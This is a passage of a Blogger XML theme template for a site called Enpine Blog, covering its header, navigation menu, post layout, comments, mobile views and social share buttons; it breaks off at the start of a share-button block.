<b:section class='header' id='header' maxwidgets='1' showaddelement='yes'>
  <b:widget id='Header1' locked='true' title='Enpine Blog (Header)' type='Header'>
    <b:includable id='main'>
  <b:if cond='data:useImage'>
    <b:if cond='data:imagePlacement == &quot;BEHIND&quot;'>
      <!--
      Show image as background to text. You can't really calculate the width
      reliably in JS because margins are not taken into account by any of
      clientWidth, offsetWidth or scrollWidth, so we don't force a minimum
      width if the user is using shrink to fit.
      This results in a margin-width's worth of pixels being cropped. If the
      user is not using shrink to fit then we expand the header.
      -->
      <b:if cond='data:mobile'>
          <div id='header-inner'>
            <div class='titlewrapper' style='background: transparent'>
              <h1 class='title' style='background: transparent; border-width: 0px'>
                <b:include name='title'/>
              </h1>
            </div>
            <b:include name='description'/>
          </div>
        <b:else/>
          <div expr:style='&quot;background-image: url(\&quot;&quot; + data:sourceUrl + &quot;\&quot;); &quot;                        + &quot;background-position: &quot;                        + data:backgroundPositionStyleStr + &quot;; &quot;                        + data:widthStyleStr                        + &quot;min-height: &quot; + data:height                        + &quot;_height: &quot; + data:height                        + &quot;background-repeat: no-repeat; &quot;' id='header-inner'>
            <div class='titlewrapper' style='background: transparent'>
              <h1 class='title' style='background: transparent; border-width: 0px'>
                <b:include name='title'/>
              </h1>
            </div>
            <b:include name='description'/>
          </div>
        </b:if>
    <b:else/>
      <!--Show the image only-->
      <div id='header-inner'>
        <a expr:href='data:blog.homepageUrl' style='display: block'>
          <img expr:alt='data:title' expr:id='data:widget.instanceId + &quot;_headerimg&quot;' expr:src='data:sourceUrl' style='display: block'/>
        </a>
        <!--Show the description-->
        <b:if cond='data:imagePlacement == &quot;BEFORE_DESCRIPTION&quot;'>
          <b:include name='description'/>
        </b:if>
      </div>
    </b:if>
  <b:else/>
    <!--No header image -->
    <div id='header-inner'>
      <div class='titlewrapper'>
        <h1 class='title'>
          <b:include name='title'/>
        </h1>
      </div>
      <b:include name='description'/>
    </div>
  </b:if>
</b:includable>
    <b:includable id='description'>
  <div class='descriptionwrapper'>
    <p class='description'><span><data:description/></span></p>
  </div>
</b:includable>
    <b:includable id='title'>
    <a expr:href='data:blog.homepageUrl'><data:title/></a>
</b:includable>
  </b:widget>
</b:section>
</div><!-- /header-inner-wrap -->


<nav class='default site-navigation' id='site-navigation' role='navigation'>
<div class='menu-main-container'>
<ul class='menu' id='menu-main'>
<li><a expr:href='data:blog.homepageUrl'>Home</a></li>
<li><a href='#'>Business</a>
<ul class='sub-menu'>
<li><a href='#'>Entertainment</a>

<ul class='sub-menu'>
<li><a href='#'>Two Columns</a></li>
<li><a href='#'>Three Columns</a></li>
<li><a href='#'>Four Columns</a></li>
</ul>
</li>
<li><a href='#'>Filtered and Cropped</a>
	
<ul class='sub-menu'>
<li><a href='#'>Two Columns</a></li>
<li><a href='#'>Three Columns</a></li>
<li><a href='#'>Four Columns</a></li>
</ul>
</li>
<li><a href='#'>Default</a>

<ul class='sub-menu'>
<li><a href='#'>Two Columns</a></li>
<li><a href='#'>Three Columns</a></li>
<li><a href='#'>Four Columns</a></li>	</ul>
</li>
<li><a href='#'>Default and Cropped</a>

<ul class='sub-menu'>
<li><a href='#'>Two Columns</a></li>
<li><a href='#'>Three Columns</a></li>
<li><a href='#'>Four Columns</a></li>
</ul>
</li>
</ul>
</li>

<li><a href='http://www.templatetrackers.com'>Technology</a>
<ul class='sub-menu'>
	<li><a href='#'>Standard Blog Layout</a></li>
	<li><a href='#'>Post with Comments</a></li>
	<li><a href='#'>Page: Right Sidebar</a></li>
</ul>
</li>
<li><a href='http://www.templatetrackers.com'>Design</a></li>
  <li><a href='#'>Tutorials</a></li>
  <li><a href='http://enpine-blog.blogspot.in/p/static-page.html'>Static Page</a></li>
</ul></div>        
</nav><!-- Navigation Menu Ends Here -->
<div class='ft-icons'>
<ul>
  <li><a href='#' rel='nofollow' target='_blank'><i class='fontawesome-rss'/></a></li>					
<li><a href='#' rel='nofollow' target='_blank'><i class='fontawesome-twitter'/></a></li>					
<li><a href='#' rel='nofollow' target='_blank'><i class='fontawesome-facebook'/></a></li>					
  <li><a href='#' rel='nofollow' target='_blank'><i class='fontawesome-google-plus'/></a></li>					
<li class='head-search'>
<div class='fontawesome-search' style=''/>
<ul class='dropdown-search' style='display:none'>
<li>
<form _lpchecked='1' action='/search' class='search-form' id='search_form' method='get'>
<fieldset style=''>
  <input id='sbox' name='s' onblur='if (this.value == &apos;&apos;) {this.value = &apos;Search the site&apos;;}' onfocus='if (this.value == &apos;Search the site&apos;) {this.value = &apos;&apos;;}' style='' type='text' value='Search the site'/>
  <input class='sbutton' id='search-image' style='border: 0px; vertical-align: top;' type='submit' value='Search'/>
</fieldset></form>
</li>
</ul>
</li>

</ul>

  
			</div>
</div>
  </div>
<!-- header wrapper ends here -->
  </div>
<div class='clr'/>
 
<div class='container'>
<div id='main'>

<div class='wrapper clearfix'>
<b:if cond='data:blog.pageType != &quot;static_page&quot;'>
<div class='recent-posts'>
<script>
document.write(&quot;&lt;script src=\&quot;/feeds/posts/default/-/&quot;+cat1+&quot;?max-results=&quot;+numposts1+&quot;&amp;orderby=published&amp;alt=json-in-script&amp;callback=showrecentposts1\&quot;&gt;&lt;\/script&gt;&quot;);
					 </script>
</div>
  </b:if>
  </div>
  <div class='clr'/>


<div class='wrapper clearfix'>
<div class='outer-wrapper'>
<b:if cond='data:blog.pageType == &quot;index&quot;'>
<h3 class='latest'>Latest From My Blog</h3>
</b:if>
<div class='main-wrapper'>
 <b:section class='content' id='content' showaddelement='no'>
   <b:widget id='Blog1' locked='true' title='Blog Posts' type='Blog'>
     <b:includable id='main' var='top'>
  <b:if cond='data:mobile == &quot;false&quot;'>

    <!-- posts -->
    <div class='blog-posts hfeed'>

      <b:include data='top' name='status-message'/>

      <data:defaultAdStart/>
      <b:loop values='data:posts' var='post'>
	<b:if cond='data:blog.pageType == &quot;static_page&quot;'>
        <b:include data='post' name='post'/>
        </b:if>
	<b:if cond='data:blog.pageType == &quot;index&quot;'>
        <b:include data='post' name='post'/>
        </b:if>
		<b:if cond='data:blog.pageType == &quot;item&quot;'>
		<div class='ft-ctbox clearfix'>
		<b:include data='post' name='post'/>
        </div>
        </b:if>
        <b:if cond='data:blog.pageType == &quot;static_page&quot;'>
          <b:include data='post' name='comment_picker'/>
        </b:if>
        <b:if cond='data:blog.pageType == &quot;item&quot;'>
          <b:include data='post' name='comment_picker'/>
        </b:if>
     
        <b:if cond='data:post.includeAd'>
          <b:if cond='data:post.isFirstPost'>
            <data:defaultAdEnd/>
          <b:else/>
            <data:adEnd/>
          </b:if>
          <div class='inline-ad'>
            <data:adCode/>
          </div>
          <data:adStart/>
        </b:if>
      </b:loop>
      <b:if cond='data:numPosts != 0'>
      </b:if>
      <data:adEnd/>
    </div>

    <!-- navigation -->
    <b:include name='nextprev'/>


    <b:if cond='data:top.showStars'>
      <script src='//www.google.com/jsapi' type='text/javascript'/>
      <script type='text/javascript'>
        google.load(&quot;annotations&quot;, &quot;1&quot;, {&quot;locale&quot;: &quot;<data:top.languageCode/>&quot;});
        function initialize() {
          google.annotations.setApplicationId(<data:top.blogspotReviews/>);
          google.annotations.createAll();
          google.annotations.fetch();
        }
        google.setOnLoadCallback(initialize);
      </script>
    </b:if>

  <b:else/>
    <b:include name='mobile-main'/>
  </b:if>

  <b:if cond='data:top.showDummy'>
    <data:top.dummyBootstrap/>
  </b:if>
</b:includable>
     <b:includable id='backlinkDeleteIcon' var='backlink'>
  <span expr:class='&quot;item-control &quot; + data:backlink.adminClass'>
    <a expr:href='data:backlink.deleteUrl' expr:title='data:top.deleteBacklinkMsg'>
      <img src='//www.blogger.com/img/icon_delete13.gif'/>
    </a>
  </span>
</b:includable>
     <b:includable id='backlinks' var='post'>
  <a name='links'/><h4><data:post.backlinksLabel/></h4>
  <b:if cond='data:post.numBacklinks != 0'>
    <dl class='comments-block' id='comments-block'>
      <b:loop values='data:post.backlinks' var='backlink'>
        <div class='collapsed-backlink backlink-control'>
          <dt class='comment-title'>
            <span class='backlink-toggle-zippy'>&#160;</span>
            <a expr:href='data:backlink.url' rel='nofollow'><data:backlink.title/></a>
            <b:include data='backlink' name='backlinkDeleteIcon'/>
          </dt>
          <dd class='comment-body collapseable'>
            <data:backlink.snippet/>
          </dd>
          <dd class='comment-footer collapseable'>
            <span class='comment-author'><data:post.authorLabel/> <data:backlink.author/></span>
            <span class='comment-timestamp'><data:post.timestampLabel/> <data:backlink.timestamp/></span>
          </dd>
        </div>
      </b:loop>
    </dl>
  </b:if>
  <p class='comment-footer'>
    <a class='comment-link' expr:href='data:post.createLinkUrl' expr:id='data:widget.instanceId + &quot;_backlinks-create-link&quot;' target='_blank'><data:post.createLinkLabel/></a>
  </p>
</b:includable>
     <b:includable id='comment-form' var='post'>
  <div class='comment-form'>
    <a name='comment-form'/>
    <b:if cond='data:mobile'>
      <h4 id='comment-post-message'>
        <a expr:id='data:widget.instanceId + &quot;_comment-editor-toggle-link&quot;' href='javascript:void(0)'><data:postCommentMsg/></a></h4>
      <p><data:blogCommentMessage/></p>
      <data:blogTeamBlogMessage/>
      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410' id='comment-editor' name='comment-editor' src='' style='display: none' width='100%'/>
    <b:else/>
      <h4 id='comment-post-message'><data:postCommentMsg/></h4>
      <p><data:blogCommentMessage/></p>
      <data:blogTeamBlogMessage/>
      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410' id='comment-editor' name='comment-editor' src='' width='100%'/>
    </b:if>
    <data:post.friendConnectJs/>
    <data:post.cmtfpIframe/>
    <script type='text/javascript'>
      BLOG_CMT_createIframe(&#39;<data:post.appRpcRelayPath/>&#39;, &#39;<data:post.communityId/>&#39;);
    </script>
  </div>
</b:includable>
     <b:includable id='commentDeleteIcon' var='comment'>
  <span expr:class='&quot;item-control &quot; + data:comment.adminClass'>
    <b:if cond='data:showCmtPopup'>
      <div class='goog-toggle-button'>
        <div class='goog-inline-block comment-action-icon'/>
      </div>
    <b:else/>
      <a class='comment-delete' expr:href='data:comment.deleteUrl' expr:title='data:top.deleteCommentMsg'>
        <img src='//www.blogger.com/img/icon_delete13.gif'/>
      </a>
    </b:if>
  </span>
</b:includable>
     <b:includable id='comment_count_picker' var='post'>
  <b:if cond='data:post.commentSource == 1'>
    <span class='cmt_count_iframe_holder' expr:data-count='data:post.numComments' expr:data-onclick='data:post.addCommentOnclick' expr:data-post-url='data:post.url' expr:data-url='data:post.canonicalUrl'>
    </span>
  <b:else/>
    <a class='comment-link' expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'>
      <data:post.commentLabelFull/>:
    </a>
  </b:if>
</b:includable>
     <b:includable id='comment_picker' var='post'>
  <b:if cond='data:post.commentSource == 1'>
    <b:include data='post' name='iframe_comments'/>
  <b:else/>
    <b:if cond='data:post.showThreadedComments'>
      <b:include data='post' name='threaded_comments'/>
    <b:else/>
      <b:include data='post' name='comments'/>
    </b:if>
  </b:if>
</b:includable>
     <b:includable id='comments' var='post'>
  <div class='comments' id='comments'>
    <b:if cond='data:post.allowComments'>
      <h4>
        <b:if cond='data:post.numComments == 1'>
          1 <data:commentLabel/>:
        <b:else/>
          <data:post.numComments/> <data:commentLabelPlural/>:
        </b:if> 
    
      </h4>

      <b:if cond='data:post.commentPagingRequired'>
        <span class='paging-control-container'>
          <a expr:class='data:post.oldLinkClass' expr:href='data:post.oldestLinkUrl'><data:post.oldestLinkText/></a>
          &#160;
          <a expr:class='data:post.oldLinkClass' expr:href='data:post.olderLinkUrl'><data:post.olderLinkText/></a>
          &#160;
          <data:post.commentRangeText/>
          &#160;
          <a expr:class='data:post.newLinkClass' expr:href='data:post.newerLinkUrl'><data:post.newerLinkText/></a>
          &#160;
          <a expr:class='data:post.newLinkClass' expr:href='data:post.newestLinkUrl'><data:post.newestLinkText/></a>
        </span>
      </b:if>

      <div expr:id='data:widget.instanceId + &quot;_comments-block-wrapper&quot;'>
        <dl expr:class='data:post.avatarIndentClass' id='comments-block'>
          <b:loop values='data:post.comments' var='comment'>
            <dt expr:class='&quot;comment-author &quot; + data:comment.authorClass' expr:id='data:comment.anchorName'>
              <b:if cond='data:comment.favicon'>
                <img expr:src='data:comment.favicon' height='16px' style='margin-bottom:-2px;' width='16px'/>
 				<b:else/>
                <img src='http://1.bp.blogspot.com/-f4DhIdAP2-U/UqBom0sGmfI/AAAAAAAADrA/tB-ulx0Ux1c/s70/trackers+logo.png'/>
              </b:if>
              <a expr:name='data:comment.anchorName'/>
              <b:if cond='data:blog.enabledCommentProfileImages'>
                <data:comment.authorAvatarImage/>
              </b:if>
              <b:if cond='data:comment.authorUrl'>
                <a expr:href='data:comment.authorUrl' rel='nofollow'><data:comment.author/></a>
              <b:else/>
                <data:comment.author/>
              </b:if>
              <data:commentPostedByMsg/>
            </dt>
            <dd class='comment-body' expr:id='data:widget.instanceId + data:comment.cmtBodyIdPostfix'>
              <b:if cond='data:comment.isDeleted'>
                <span class='deleted-comment'><data:comment.body/></span>
              <b:else/>
                <p>
                  <data:comment.body/>
                </p>
              </b:if>
            </dd>
            <dd class='comment-footer'>
              <span class='comment-timestamp'>
                <a expr:href='data:comment.url' title='comment permalink'>
                  <data:comment.timestamp/>
                </a>
                <b:include data='comment' name='commentDeleteIcon'/>
              </span>
            </dd>
          </b:loop>
        </dl>
      </div>

      <b:if cond='data:post.commentPagingRequired'>
        <span class='paging-control-container'>
          <a expr:class='data:post.oldLinkClass' expr:href='data:post.oldestLinkUrl'>
            <data:post.oldestLinkText/>
          </a>
          <a expr:class='data:post.oldLinkClass' expr:href='data:post.olderLinkUrl'>
            <data:post.olderLinkText/>
          </a>
          &#160;
          <data:post.commentRangeText/>
          &#160;
          <a expr:class='data:post.newLinkClass' expr:href='data:post.newerLinkUrl'>
            <data:post.newerLinkText/>
          </a>
          <a expr:class='data:post.newLinkClass' expr:href='data:post.newestLinkUrl'>
            <data:post.newestLinkText/>
          </a>
        </span>
      </b:if>

      <p class='comment-footer'>
        <b:if cond='data:post.embedCommentForm'>
          <b:if cond='data:post.allowNewComments'>
            <b:include data='post' name='comment-form'/>
          <b:else/>
            <data:post.noNewCommentsText/>
          </b:if>
        <b:else/>
          <b:if cond='data:post.allowComments'>
            <a expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'><data:postCommentMsg/></a>
          </b:if>
        </b:if>

      </p>
    </b:if>
    <b:if cond='data:showCmtPopup'>
      <div id='comment-popup'>
        <iframe allowtransparency='true' frameborder='0' id='comment-actions' name='comment-actions' scrolling='no'>
        </iframe>
      </div>
    </b:if>

    <div id='backlinks-container'>
    <div expr:id='data:widget.instanceId + &quot;_backlinks-container&quot;'>
       <b:if cond='data:post.showBacklinks'>
         <b:include data='post' name='backlinks'/>
       </b:if>
    </div>
    </div>
  </div>
</b:includable>
     <b:includable id='feedLinks'>
  <b:if cond='data:blog.pageType != &quot;item&quot;'> <!-- Blog feed links -->
    <b:if cond='data:feedLinks'>
      <div class='blog-feeds'>
        <b:include data='feedLinks' name='feedLinksBody'/>
      </div>
    </b:if>

    <b:else/> <!--Post feed links -->
    <div class='post-feeds'>
      <b:loop values='data:posts' var='post'>
        <b:if cond='data:post.allowComments'>
          <b:if cond='data:post.feedLinks'>
            <b:include data='post.feedLinks' name='feedLinksBody'/>
          </b:if>
        </b:if>
      </b:loop>
    </div>
  </b:if>
</b:includable>
     <b:includable id='feedLinksBody' var='links'>
  <div class='feed-links'>
  <data:feedLinksMsg/>
  <b:loop values='data:links' var='f'>
     <a class='feed-link' expr:href='data:f.url' expr:type='data:f.mimeType' target='_blank'><data:f.name/> (<data:f.feedType/>)</a>
  </b:loop>
  </div>
</b:includable>
     <b:includable id='iframe_comments' var='post'>

  <b:if cond='data:post.allowIframeComments'>
    <script expr:src='data:post.iframeCommentSrc' type='text/javascript'/>
    <div class='cmt_iframe_holder' expr:data-href='data:post.canonicalUrl' expr:data-viewtype='data:post.viewType'/>

    <b:if cond='data:post.embedCommentForm == &quot;false&quot;'>
      <a expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'><data:postCommentMsg/></a>
    </b:if>
  </b:if>
</b:includable>
     <b:includable id='mobile-index-post' var='post'>
  <div class='mobile-date-outer date-outer'>
    <b:if cond='data:post.dateHeader'>
      <div class='date-header'>
        <span><data:post.dateHeader/></span>
      </div>
    </b:if>

    <div class='mobile-post-outer'>
      <a expr:href='data:post.url'>
        <h3 class='mobile-index-title entry-title' itemprop='name'>
          <data:post.title/>
        </h3>

        <div class='mobile-index-arrow'>&amp;rsaquo;</div>

        <div class='mobile-index-contents'>
          <b:if cond='data:post.thumbnailUrl'>
            <div class='mobile-index-thumbnail'>
              <div class='Image'>
                <img expr:src='data:post.thumbnailUrl'/>
              </div>
            </div>
          </b:if>

          <div class='post-body'>
            <b:if cond='data:post.snippet'><data:post.snippet/></b:if>
          </div>
        </div>

        <div style='clear: both;'/>
      </a>

      <div class='mobile-index-comment'>
        <b:if cond='data:blog.pageType != &quot;static_page&quot;'>
          <b:if cond='data:post.allowComments'>
            <b:if cond='data:post.numComments != 0'>
              <a class='comment-link' expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'><b:if cond='data:post.numComments == 1'>1 <data:top.commentLabel/><b:else/><data:post.numComments/> <data:top.commentLabelPlural/></b:if></a>
            </b:if>
          </b:if>
        </b:if>
      </div>
    </div>
  </div>
</b:includable>
     <b:includable id='mobile-main' var='top'>
    <!-- posts -->
    <div class='blog-posts hfeed'>

      <b:include data='top' name='status-message'/>

      <b:if cond='data:blog.pageType == &quot;index&quot;'>
        <b:loop values='data:posts' var='post'>
          <b:include data='post' name='mobile-index-post'/>
        </b:loop>
      <b:else/>
        <b:loop values='data:posts' var='post'>
          <b:include data='post' name='mobile-post'/>
        </b:loop>
      </b:if>
    </div>

   <b:include name='mobile-nextprev'/>
</b:includable>
     <b:includable id='mobile-nextprev'>
  <div class='blog-pager' id='blog-pager'>
    <b:if cond='data:newerPageUrl'>
      <div class='mobile-link-button' id='blog-pager-newer-link'>
      <a class='blog-pager-newer-link' expr:href='data:newerPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-newer-link&quot;' expr:title='data:newerPageTitle'>&amp;lsaquo;</a>
      </div>
    </b:if>

    <b:if cond='data:olderPageUrl'>
      <div class='mobile-link-button' id='blog-pager-older-link'>
      <a class='blog-pager-older-link' expr:href='data:olderPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-older-link&quot;' expr:title='data:olderPageTitle'>&amp;rsaquo;</a>
      </div>
    </b:if>

    <div class='mobile-link-button' id='blog-pager-home-link'>
    <a class='home-link' expr:href='data:blog.homepageUrl'><data:homeMsg/></a>
    </div>

    <div class='mobile-desktop-link'>
      <a class='home-link' expr:href='data:desktopLinkUrl'><data:desktopLinkMsg/></a>
    </div>

  </div>
  <div class='clear'/>
</b:includable>
     <b:includable id='mobile-post' var='post'>
  <div class='date-outer'>
    <b:if cond='data:post.dateHeader'>
      <h2 class='date-header'><span><data:post.dateHeader/></span></h2>
    </b:if>
    <div class='date-posts'>
      <div class='post-outer'>

        <div class='post hentry uncustomized-post-template'>
          <a expr:name='data:post.id'/>
          <b:if cond='data:post.title'>
            <h1 class='post-title entry-title'>
              <b:if cond='data:post.link'>
                <a expr:href='data:post.link'><data:post.title/></a>
              <b:else/>
                <b:if cond='data:post.url'>
                  <b:if cond='data:blog.url != data:post.url'>
                    <a expr:href='data:post.url'><data:post.title/></a>
                  <b:else/>
                    <data:post.title/>
                  </b:if>
                <b:else/>
                  <data:post.title/>
                </b:if>
              </b:if>
            </h1>
          </b:if>

          <div class='post-header'>
            <div class='post-header-line-1'/>
          </div>

          <div class='post-body entry-content' expr:id='&quot;post-body-&quot; + data:post.id'>
            <data:post.body/>
            <div style='clear: both;'/> <!-- clear for photos floats -->
          </div>

          <div class='post-footer'>
            <div class='post-footer-line post-footer-line-1'>
              <span class='post-author vcard'>
                <b:if cond='data:top.showAuthor'>
                  <b:if cond='data:post.authorProfileUrl'>
                    <span class='fn'>
                      <a expr:href='data:post.authorProfileUrl' rel='author' title='author profile'>
                        <data:post.author/>
                      </a>
                    </span>
                  <b:else/>
                    <span class='fn'><data:post.author/></span>
                  </b:if>
                </b:if>
              </span>

              <span class='post-timestamp'>
                <b:if cond='data:top.showTimestamp'>
                  <data:top.timestampLabel/>
                  <b:if cond='data:post.url'>
                    <a class='timestamp-link' expr:href='data:post.url' rel='bookmark' title='permanent link'><abbr class='published' expr:title='data:post.timestampISO8601'><data:post.timestamp/></abbr></a>
                  </b:if>
                </b:if>
              </span>

              <span class='post-comment-link'>
                <b:if cond='data:blog.pageType != &quot;item&quot;'>
                  <b:if cond='data:blog.pageType != &quot;static_page&quot;'>
                    <b:if cond='data:post.allowComments'>
                      <a class='comment-link' expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'><b:if cond='data:post.numComments == 1'>1 <data:top.commentLabel/><b:else/><data:post.numComments/> <data:top.commentLabelPlural/></b:if></a>
                    </b:if>
                  </b:if>
                </b:if>
              </span>
            </div>

            <div class='post-footer-line post-footer-line-2'>
              <b:if cond='data:top.showMobileShare'>
                <div class='mobile-link-button goog-inline-block' id='mobile-share-button'>
                  <a href='javascript:void(0);'><data:shareMsg/></a>
                </div>
              </b:if>
              <b:if cond='data:top.showDummy'>
                <div class='goog-inline-block dummy-container'><data:post.dummyTag/></div>
              </b:if>
            </div>

          </div>
        </div>
        <b:if cond='data:blog.pageType == &quot;static_page&quot;'>
          <b:include data='post' name='comment_picker'/>
        </b:if>
        <b:if cond='data:blog.pageType == &quot;item&quot;'>
          <b:include data='post' name='comment_picker'/>
        </b:if>
      </div>
    </div>
  </div>
</b:includable>
     <b:includable id='nextprev'>
  <div class='blog-pager' id='blog-pager'>
    <b:if cond='data:newerPageUrl'>
      <span id='blog-pager-newer-link'>
      <a class='blog-pager-newer-link' expr:href='data:newerPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-newer-link&quot;' expr:title='data:newerPageTitle'><data:newerPageTitle/></a>
      </span>
    </b:if>

    <b:if cond='data:olderPageUrl'>
      <span id='blog-pager-older-link'>
      <a class='blog-pager-older-link' expr:href='data:olderPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-older-link&quot;' expr:title='data:olderPageTitle'><data:olderPageTitle/></a>
      </span>
    </b:if>

    <a class='home-link' expr:href='data:blog.homepageUrl'><data:homeMsg/></a>

    <b:if cond='data:mobileLinkUrl'>
      <div class='blog-mobile-link'>
        <a expr:href='data:mobileLinkUrl'><data:mobileLinkMsg/></a>
      </div>
    </b:if>

  </div>
  <div class='clear'/>
</b:includable>
     <b:includable id='post' var='post'>
<div class='post hentry'>
<div class='inner'>
<b:if cond='data:blog.pageType == &quot;item&quot;'>
<b:if cond='data:post.title'>
<h1 class='post-title entry-title'>
<b:if cond='data:post.link'>       
<a expr:href='data:post.link'><data:post.title/></a>    
<b:else/>
<b:if cond='data:post.url'>
<b:if cond='data:blog.url != data:post.url'>
<a expr:href='data:post.url'><data:post.title/></a>
<b:else/>
<data:post.title/>
</b:if>
<b:else/>
<data:post.title/>
</b:if>
</b:if>
</h1>
</b:if>
</b:if>

<b:if cond='data:blog.pageType == &quot;item&quot;'>
 <div class='post-header'>
<span class='post-label'>
<b:if cond='data:post.labels'>
<b:loop values='data:post.labels' var='label'>
  <div><a expr:href='data:label.url' rel='tag'><data:label.name/></a></div><b:if cond='data:label.isLast != &quot;false&quot;'/>
</b:loop>
</b:if>
</span>

<span class='post-timestamp'>
<b:if cond='data:top.showTimestamp'>
<b:if cond='data:post.url'>
<a expr:href='data:post.url'>
<data:post.timestamp/>
</a>
</b:if>
</b:if>
</span>
</div>
    </b:if>

<div class='post-body entry-content' expr:id='data:post.id'>
<b:if cond='data:blog.pageType == &quot;item&quot;'>
<data:post.body/>
<b:else/>
<div class='body-post'>
<b:if cond='data:blog.pageType == &quot;index&quot;'>
<!-- post img -->
<div class='entry-image'>
<a expr:href='data:post.url'>
<script type='text/javascript'>
document.write(image_plugin(&quot;<data:post.thumbnailUrl/>&quot;,&quot;<data:post.title/>&quot;));</script>
</a>
</div>
<div class='entry-container'>

<div class='item-label'>
<b:if cond='data:post.labels'>
<b:loop values='data:post.labels' var='label'>
<a expr:href='data:label.url' rel='tag'><data:label.name/></a><b:if cond='data:label.isLast != &quot;false&quot;'/>
</b:loop>
</b:if>
</div>

<h2 class='post-title'><a expr:href='data:post.url'><data:post.title/></a></h2>

<div class='post-excerpt' expr:id='&quot;summary&quot; + data:post.id'>
<data:post.body/>
</div>
<script type='text/javascript'>createSummaryAndThumb(&quot;summary<data:post.id/>&quot;);</script>
</div>

<b:else/>
<b:if cond='data:blog.pageType == &quot;static_page&quot;'>
<data:post.body/>
</b:if>
</b:if>
</div>

<b:if cond='data:blog.pageType == &quot;index&quot;'>
<div class='ft-tish'>
<div class='ft-ftime'>
<b:if cond='data:top.showTimestamp'>
<b:if cond='data:post.url'>
<a expr:href='data:post.url'>
<data:post.timestamp/>
</a>
</b:if>
</b:if>
</div>
<div class='ft-fshare'>
<ul>
<li><a class='zocial-twitter' data-title='Twitter' expr:href='&quot;http://twitter.com/share?url=&quot; + data:post.url + &quot;&amp;title=&quot; + data:post.title' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=550, height=600, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow'/></li>
<li><a class='zocial-facebook' data-title='Facebook' expr:href='&quot;http://www.facebook.com/sharer.php?u=&quot; + data:post.url + &quot;&amp;title=&quot;+ data:post.title' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=550, height=600, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow'/>
</li>
<li><a class='zocial-googleplus' data-title='Google+' expr:href='&quot;https://plus.google.com/u/0/share?url=&quot; + data:post.url' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=550, height=600, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow'/></li>
</ul>
</div>
</div>
</b:if>


</b:if>
    </div>
<div style='clear: both;'/> <!-- clear for photos floats -->
<div class='post-footer'>    
<div class='post-footer-line post-footer-line-1'>
<b:if cond='data:blog.pageType == &quot;item&quot;'>
<div class='share-story-container'>
<ul class='share-story'>
<li><a class='tweet tips' data-title='Twitter' expr:href='&quot;http://twitter.com/share?url=&quot; + data:post.url + &quot;&amp;title=&quot; + data:post.title' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=550, height=600, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow'>Tweet It</a></li>
<li><a class='fb-tips' data-title='Facebook' expr:href='&quot;http://www.facebook.com/sharer.php?u=&quot; + data:post.url + &quot;&amp;title=&quot;+ data:post.title' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=550, height=600, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow'>Like It</a>
</li>
 <li><a class='googleplus tips' data-title='Google+' expr:href='&quot;https://plus.google.com/u/0/share?url=&quot; + data:post.url' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=550, height=600, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow'>Google+</a></li>

<li><a class='linkedin tips' data-title='Linkedin' expr:href='&quot;http://www.linkedin.com/shareArticle?mini=true&amp;url=&quot; + data:post.url + &quot;&amp;title=&quot; + data:post.title + &quot;&amp;source=&quot; + data:blog.title' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=550, height=600, left=24, top=24, scrollbars, resizable&apos;); return false;'>Linkedin</a></li>

  <li><a class='pin-it tips' data-title='Pin it' expr:href='&quot;http://pinterest.com/pin/create/button/?url=&quot; + data:post.url + &quot;&amp;media=&quot; + data:post.thumbnailUrl + &quot;&amp;description=&quot; + data:post.snippet' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=550, height=600, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow'>Pin it</a></li>

 <li><a class='stumble tips' data-title='Stumle-Upon' expr:href='&quot;http://www.stumbleupon.com/submit?url=&quot; + data:post.url + &quot;&amp;title=&quot; + data:post.title' onclick='window.open(this.href, &apos;windowName&apos;, &apos;width=550, height=600, left=24, top=24, scrollbars, resizable&apos;); return false;' rel='nofollow'>Stumble</a></li>	

</ul>
</div>
</b:if>
</div>

<div class='post-footer-line post-footer-line-2'>
<b:if cond='data:blog.pageType == &quot;item&quot;'>
<div class='author-profile' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
<b:if cond='data:post.authorPhoto.url'>
<a expr:href='data:post.authorProfileUrl'>
<div class='auhtor-image'>
<img expr:src='data:post.authorPhoto.url' itemprop='image' width='100px'/>
</div>
</a>
</b:if>
<div>
<a class='g-profile' expr:href='data:post.authorProfileUrl' itemprop='url' rel='author' title='author profile'>
<span itemprop='name'><data:post.author/></span>
</a>
</div>
<p class='description' itemprop='description'><data:post.authorAboutMe/></p>
</div>
</b:if>
 </div>

<div class='post-footer-line post-footer-line-3'> </div>
    </div>
  </div>
</div>
</b:includable>
     <b:includable id='postQuickEdit' var='post'>
  <b:if cond='data:post.editUrl'>
    <span expr:class='&quot;item-control &quot; + data:post.adminClass'>
      <a expr:href='data:post.editUrl' expr:title='data:top.editPostMsg'>
        <img alt='' class='icon-action' height='18' src='http://img2.blogblog.com/img/icon18_edit_allbkg.gif' width='18'/>
      </a>
    </span>
  </b:if>
</b:includable>
     <b:includable id='shareButtons' var='post'>
